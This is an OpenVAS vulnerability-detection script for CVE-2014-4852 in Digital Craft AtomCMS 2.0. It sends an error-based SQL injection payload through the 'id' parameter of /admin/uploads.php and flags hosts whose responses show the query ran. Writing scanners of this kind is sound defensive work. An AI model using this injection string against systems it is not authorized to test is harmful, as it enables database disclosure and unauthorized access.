###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atomcms_id_file_upload_n_sql_inj_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# Digital Craft AtomCMS Arbitrary File Upload and SQL Injection Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804681");
  script_version("$Revision: 11402 $");
  script_cve_id("CVE-2014-4852");
  script_bugtraq_id(68437);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-07-17 12:04:59 +0530 (Thu, 17 Jul 2014)");
  script_name("Digital Craft AtomCMS Arbitrary File Upload and SQL Injection Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with Digital Craft AtomCMS and is prone to file upload
  and sql injection vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able
  execute sql query or not.");
  script_tag(name:"insight", value:"Input passed via the 'id' parameter to /admin/uploads.php script is
  not properly sanitised before being used.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to gain unauthorized privileges and
  manipulate SQL queries in the backend database allowing for the manipulation
  or disclosure of arbitrary data.");
  script_tag(name:"affected", value:"Digital Craft AtomCMS version 2.0");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127371");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/cms", "/AtomCMS", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if(rcvRes && rcvRes =~ "AtomCMS ([0-9.]+)<")
  {
    url = dir + "/admin/uploads.php?id=1 and(select 1 FROM(select  count(*)" +
             ",concat((select (select concat(database())) FROM  information" +
             "_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM  information_s" +
             "chema.tables GROUP BY x)a)";

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"UPDATE users SET avatar",
       extra_check: make_list("id", ">Table")))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);